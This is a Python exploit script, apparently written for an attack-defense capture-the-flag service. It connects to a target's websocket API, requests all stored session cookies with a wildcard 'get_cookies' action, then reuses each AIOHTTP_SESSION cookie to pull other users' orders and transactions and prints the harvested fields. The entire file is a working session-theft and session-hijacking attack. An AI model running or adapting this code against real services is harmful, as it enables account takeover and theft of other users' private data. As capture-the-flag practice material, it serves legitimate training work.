#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys

import json
import requests.cookies
from websocket import create_connection

if len(sys.argv) < 2:
    print(f'Usage: {sys.argv[0]} HOST')
    exit(0)

ip = sys.argv[1]
url = f'ws://{ip}:9090/api/ws'

ws = create_connection(url, timeout=5)
ws.recv()

data = json.dumps({'action': 'get_cookies', 'data': '*'})
ws.send(data)

response = json.loads(ws.recv())

jar = requests.cookies.RequestsCookieJar()

url_orders = f'http://{ip}:9090/api/get_orders'
url_transactions = f'http://{ip}:9090/api/get_transactions'
orders_set = set()
transactions_set = set()

for cookie in response['Response']['cookies']:
    one = requests.cookies.RequestsCookieJar()
    one.set('AIOHTTP_SESSION', cookie[16:])
    s = requests.Session()
    s.cookies = one

    response = s.get(url_orders).json()
    for order in response['orders']:
        orders_set.add(order['description'])

    response = s.get(url_transactions).json()
    for transaction in response['transactions']:
        transactions_set.add(transaction['msg'])

print(orders_set)
print(transactions_set)